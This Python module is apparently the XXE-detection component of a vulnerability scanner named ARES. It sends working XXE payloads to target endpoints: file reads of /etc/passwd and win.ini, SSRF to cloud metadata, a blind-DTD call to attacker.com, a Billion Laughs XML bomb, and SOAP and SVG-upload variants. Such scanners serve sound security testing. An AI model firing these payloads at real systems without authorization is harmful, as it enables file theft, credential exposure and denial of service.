"""
XML External Entity (XXE) Injection Detector for ARES
Detects XXE vulnerabilities in XML parsers
"""

from typing import List, Dict, Optional
from dataclasses import dataclass
import re
import asyncio
import aiohttp
from loguru import logger


@dataclass
class XXEPayload:
    """XXE test payload"""
    payload: str
    xxe_type: str  # file_disclosure, ssrf, dos, blind
    expected_behavior: str
    detection_marker: str


@dataclass
class XXEResult:
    """Result of XXE vulnerability test"""
    is_vulnerable: bool
    confidence: float
    xxe_type: str
    payload_used: str
    evidence: str
    url: str
    parameter: str
    severity: str


class XXEDetector:
    """XML External Entity injection vulnerability detector"""
    
    # Detection marker for XXE tests
    MARKER = "ARES_XXE_DETECTION_123456"
    
    def __init__(
        self,
        timeout: int = 15,
        callback_server: str = None
    ):
        self.timeout = timeout
        self.callback_server = callback_server
        self.session = None
    
    async def _get_session(self) -> aiohttp.ClientSession:
        """Get or create aiohttp session"""
        if self.session is None:
            self.session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=self.timeout),
                connector=aiohttp.TCPConnector(ssl=False)
            )
        return self.session
    
    def get_xxe_payloads(self) -> List[XXEPayload]:
        """Get XXE test payloads"""
        
        payloads = []
        
        # 1. Basic file disclosure (Linux)
        payloads.append(XXEPayload(
            payload=f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>''',
            xxe_type="file_disclosure_linux",
            expected_behavior="Contents of /etc/passwd in response",
            detection_marker="root:"
        ))
        
        # 2. Basic file disclosure (Windows)
        payloads.append(XXEPayload(
            payload=f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
<foo>&xxe;</foo>''',
            xxe_type="file_disclosure_windows",
            expected_behavior="Contents of win.ini in response",
            detection_marker="[fonts]"
        ))
        
        # 3. PHP wrapper for base64 encoding
        payloads.append(XXEPayload(
            payload=f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >]>
<foo>&xxe;</foo>''',
            xxe_type="file_disclosure_php_wrapper",
            expected_behavior="Base64 encoded file contents",
            detection_marker="cm9vdD"  # "root" in base64
        ))
        
        # 4. SSRF via XXE (metadata)
        payloads.append(XXEPayload(
            payload=f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/" >]>
<foo>&xxe;</foo>''',
            xxe_type="ssrf_metadata",
            expected_behavior="AWS metadata in response",
            detection_marker="ami-id"
        ))
        
        # 5. SSRF via XXE (localhost)
        payloads.append(XXEPayload(
            payload=f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/" >]>
<foo>&xxe;</foo>''',
            xxe_type="ssrf_localhost",
            expected_behavior="Localhost response",
            detection_marker=""
        ))
        
        # 6. Out-of-band XXE (if callback server available)
        if self.callback_server:
            payloads.append(XXEPayload(
                payload=f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://{self.callback_server}/xxe" >]>
<foo>&xxe;</foo>''',
                xxe_type="oob_xxe",
                expected_behavior="DNS/HTTP request to callback server",
                detection_marker=""
            ))
        
        # 7. Blind XXE with parameter entities
        payloads.append(XXEPayload(
            payload=f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd" >
%dtd;
]>
<foo>&xxe;</foo>''',
            xxe_type="blind_xxe_parameter",
            expected_behavior="External DTD loaded",
            detection_marker=""
        ))
        
        # 8. Billion Laughs (XML bomb / DoS)
        payloads.append(XXEPayload(
            payload='''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>''',
            xxe_type="billion_laughs_dos",
            expected_behavior="Delayed response or error",
            detection_marker=""
        ))
        
        # 9. XXE with CDATA
        payloads.append(XXEPayload(
            payload=f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
<!ENTITY wrapper "<![CDATA[&xxe;]]>" >
]>
<foo>&wrapper;</foo>''',
            xxe_type="file_disclosure_cdata",
            expected_behavior="File contents wrapped in CDATA",
            detection_marker="root:"
        ))
        
        # 10. XXE with custom marker
        payloads.append(XXEPayload(
            payload=f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY xxe "{self.MARKER}" >]>
<foo>&xxe;</foo>''',
            xxe_type="marker_reflection",
            expected_behavior="Marker reflected in response",
            detection_marker=self.MARKER
        ))
        
        return payloads
    
    async def test_parameter(
        self,
        url: str,
        parameter: str,
        method: str = "POST",
        content_type: str = "application/xml"
    ) -> List[XXEResult]:
        """
        Test a parameter for XXE vulnerabilities
        
        Args:
            url: Target URL
            parameter: Parameter name (for multipart/form-data) or None for raw XML
            method: HTTP method
            content_type: Content-Type header
        
        Returns:
            List of XXE findings
        """
        results = []
        session = await self._get_session()
        
        payloads = self.get_xxe_payloads()
        
        for payload_obj in payloads:
            try:
                # Prepare request based on content type
                headers = {'Content-Type': content_type}
                
                if parameter:
                    # Parameter-based (form data)
                    data = {parameter: payload_obj.payload}
                else:
                    # Raw XML body
                    data = payload_obj.payload
                
                # Send request
                start_time = asyncio.get_event_loop().time()
                
                async with session.request(
                    method,
                    url,
                    data=data if not parameter else None,
                    params=data if method.upper() == "GET" and parameter else None,
                    json=None,
                    headers=headers,
                    allow_redirects=False
                ) as response:
                    elapsed = asyncio.get_event_loop().time() - start_time
                    content = await response.text()
                    status = response.status
                
                # Analyze response for XXE indicators
                result = self._analyze_xxe_response(
                    url=url,
                    parameter=parameter or "xml_body",
                    payload_obj=payload_obj,
                    response_content=content,
                    response_status=status,
                    elapsed_time=elapsed
                )
                
                if result:
                    results.append(result)
                    logger.warning(f"XXE found: {url} - {result.xxe_type}")
            
            except asyncio.TimeoutError:
                # Timeout might indicate DoS attack success
                if payload_obj.xxe_type == "billion_laughs_dos":
                    results.append(XXEResult(
                        is_vulnerable=True,
                        confidence=0.8,
                        xxe_type="billion_laughs_dos",
                        payload_used=payload_obj.payload[:100] + "...",
                        evidence="Request timed out, indicating possible XML bomb DoS",
                        url=url,
                        parameter=parameter or "xml_body",
                        severity="high"
                    ))
            
            except Exception as e:
                logger.debug(f"XXE test failed for {payload_obj.xxe_type}: {e}")
        
        return results
    
    def _analyze_xxe_response(
        self,
        url: str,
        parameter: str,
        payload_obj: XXEPayload,
        response_content: str,
        response_status: int,
        elapsed_time: float
    ) -> Optional[XXEResult]:
        """Analyze response for XXE vulnerability indicators"""
        
        # Check for detection marker
        if payload_obj.detection_marker and payload_obj.detection_marker in response_content:
            return XXEResult(
                is_vulnerable=True,
                confidence=0.95,
                xxe_type=payload_obj.xxe_type,
                payload_used=payload_obj.payload[:200] + "..." if len(payload_obj.payload) > 200 else payload_obj.payload,
                evidence=f"XXE marker detected in response: '{payload_obj.detection_marker}'",
                url=url,
                parameter=parameter,
                severity=self._get_severity(payload_obj.xxe_type)
            )
        
        # File disclosure - check for common file patterns
        if "file_disclosure" in payload_obj.xxe_type:
            file_indicators = [
                r'root:.*?:/bin/',  # /etc/passwd
                r'\[fonts\]',  # win.ini
                r'daemon:',  # /etc/passwd
                r'nobody:',  # /etc/passwd
            ]
            
            for pattern in file_indicators:
                if re.search(pattern, response_content, re.IGNORECASE):
                    return XXEResult(
                        is_vulnerable=True,
                        confidence=0.9,
                        xxe_type=payload_obj.xxe_type,
                        payload_used=payload_obj.payload[:200] + "...",
                        evidence=f"File contents disclosed via XXE: pattern '{pattern}' found",
                        url=url,
                        parameter=parameter,
                        severity="critical"
                    )
        
        # SSRF - check for metadata or internal service indicators
        if "ssrf" in payload_obj.xxe_type:
            ssrf_indicators = [
                'ami-id', 'instance-id',  # AWS metadata
                'security-credentials',
                'computeMetadata',  # GCP
                'localhost', '127.0.0.1',
                'apache', 'nginx'
            ]
            
            for indicator in ssrf_indicators:
                if indicator in response_content.lower():
                    return XXEResult(
                        is_vulnerable=True,
                        confidence=0.85,
                        xxe_type=payload_obj.xxe_type,
                        payload_used=payload_obj.payload[:200] + "...",
                        evidence=f"SSRF via XXE detected: '{indicator}' in response",
                        url=url,
                        parameter=parameter,
                        severity="critical"
                    )
        
        # DoS - check for delayed response
        if "dos" in payload_obj.xxe_type:
            if elapsed_time > 5.0:  # Significant delay
                return XXEResult(
                    is_vulnerable=True,
                    confidence=0.7,
                    xxe_type=payload_obj.xxe_type,
                    payload_used="Billion Laughs DoS payload",
                    evidence=f"Response delayed by {elapsed_time:.2f} seconds, indicating XML bomb",
                    url=url,
                    parameter=parameter,
                    severity="high"
                )
        
        # Marker reflection test
        if payload_obj.xxe_type == "marker_reflection":
            if self.MARKER in response_content:
                return XXEResult(
                    is_vulnerable=True,
                    confidence=0.8,
                    xxe_type="xxe_entity_expansion",
                    payload_used=payload_obj.payload[:200] + "...",
                    evidence="XML entity expanded and reflected in response",
                    url=url,
                    parameter=parameter,
                    severity="high"
                )
        
        # Check for XML parsing errors that indicate XXE attempt was processed
        error_patterns = [
            r'XML.*?error',
            r'external entity',
            r'DOCTYPE.*?forbidden',
            r'entity.*?not.*?defined',
            r'Entity.*?not.*?found'
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, response_content, re.IGNORECASE):
                return XXEResult(
                    is_vulnerable=True,
                    confidence=0.6,
                    xxe_type="xxe_parsing_attempted",
                    payload_used=payload_obj.payload[:200] + "...",
                    evidence=f"XML parser processed external entity (error: {pattern})",
                    url=url,
                    parameter=parameter,
                    severity="medium"
                )
        
        return None
    
    def _get_severity(self, xxe_type: str) -> str:
        """Determine severity based on XXE type"""
        
        if "file_disclosure" in xxe_type or "ssrf" in xxe_type:
            return "critical"
        elif "dos" in xxe_type:
            return "high"
        elif "blind" in xxe_type or "oob" in xxe_type:
            return "high"
        else:
            return "medium"
    
    async def test_xml_endpoint(
        self,
        url: str,
        method: str = "POST",
        sample_xml: str = None
    ) -> List[XXEResult]:
        """
        Test an XML endpoint for XXE vulnerabilities
        
        Args:
            url: Target URL
            method: HTTP method
            sample_xml: Sample valid XML (optional)
        
        Returns:
            List of XXE findings
        """
        return await self.test_parameter(
            url=url,
            parameter=None,  # Raw XML body
            method=method,
            content_type="application/xml"
        )
    
    async def test_soap_endpoint(
        self,
        url: str,
        soap_action: str = None
    ) -> List[XXEResult]:
        """
        Test a SOAP endpoint for XXE vulnerabilities
        
        Args:
            url: SOAP endpoint URL
            soap_action: SOAP action header value
        
        Returns:
            List of XXE findings
        """
        session = await self._get_session()
        results = []
        
        # SOAP-specific XXE payloads
        soap_payloads = [
            f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <foo>&xxe;</foo>
  </soap:Body>
</soap:Envelope>''',
        ]
        
        for payload in soap_payloads:
            try:
                headers = {
                    'Content-Type': 'text/xml; charset=utf-8'
                }
                
                if soap_action:
                    headers['SOAPAction'] = soap_action
                
                async with session.post(
                    url,
                    data=payload,
                    headers=headers,
                    allow_redirects=False
                ) as response:
                    content = await response.text()
                
                # Check for file disclosure
                if 'root:' in content or 'daemon:' in content:
                    results.append(XXEResult(
                        is_vulnerable=True,
                        confidence=0.95,
                        xxe_type="soap_xxe_file_disclosure",
                        payload_used=payload[:200] + "...",
                        evidence="File contents disclosed via SOAP XXE",
                        url=url,
                        parameter="soap_body",
                        severity="critical"
                    ))
            
            except Exception as e:
                logger.debug(f"SOAP XXE test failed: {e}")
        
        return results
    
    async def test_svg_upload(
        self,
        url: str,
        file_parameter: str = "file"
    ) -> List[XXEResult]:
        """
        Test SVG file upload for XXE vulnerabilities
        
        Args:
            url: Upload endpoint URL
            file_parameter: File parameter name
        
        Returns:
            List of XXE findings
        """
        session = await self._get_session()
        results = []
        
        # SVG with XXE
        svg_xxe = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <text x="0" y="16">&xxe;</text>
</svg>'''
        
        try:
            # Upload SVG file
            data = aiohttp.FormData()
            data.add_field(
                file_parameter,
                svg_xxe,
                filename='test.svg',
                content_type='image/svg+xml'
            )
            
            async with session.post(url, data=data) as response:
                content = await response.text()
            
            # Check for file disclosure
            if 'root:' in content or 'daemon:' in content:
                results.append(XXEResult(
                    is_vulnerable=True,
                    confidence=0.9,
                    xxe_type="svg_xxe_file_disclosure",
                    payload_used="SVG with external entity",
                    evidence="File contents disclosed via SVG XXE upload",
                    url=url,
                    parameter=file_parameter,
                    severity="critical"
                ))
        
        except Exception as e:
            logger.debug(f"SVG XXE test failed: {e}")
        
        return results
    
    async def close(self):
        """Close aiohttp session"""
        if self.session:
            await self.session.close()
            self.session = None
